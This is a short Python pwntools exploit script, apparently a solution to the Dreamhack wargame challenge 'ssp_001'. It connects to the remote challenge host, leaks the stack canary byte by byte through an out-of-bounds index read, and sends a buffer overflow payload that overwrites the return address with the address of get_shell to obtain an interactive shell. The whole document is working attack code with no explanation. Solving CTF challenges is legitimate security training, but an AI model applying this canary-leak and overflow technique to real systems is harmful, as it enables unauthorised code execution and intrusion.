#! /usr/bin/python3 

from pwn import *

def slog(name, addr):
  return success(" : ".join([name, hex(addr)]))

p = remote("host1.dreamhack.games", 11999)

e = ELF('./ssp_001')

get_shell = e.symbols['get_shell']

#Canary leak

canary = b""

i = 131
while i >= 128:
  p.sendlineafter("> ", 'P')
  p.sendlineafter("Element index : ", str(i))
  p.recvuntil("is : ")
  canary += p.recvn(2)
  i -= 1

canary = int(canary, 16)
slog("canary", canary)


#BOF
payload = b'A' * 64
payload += p32(canary)
payload += b'A' * 8
payload += p32(get_shell)

p.sendlineafter("> ", 'E')
p.sendlineafter("Name Size : ", str(1000))
p.sendlineafter("Name : ", payload)

p.interactive()
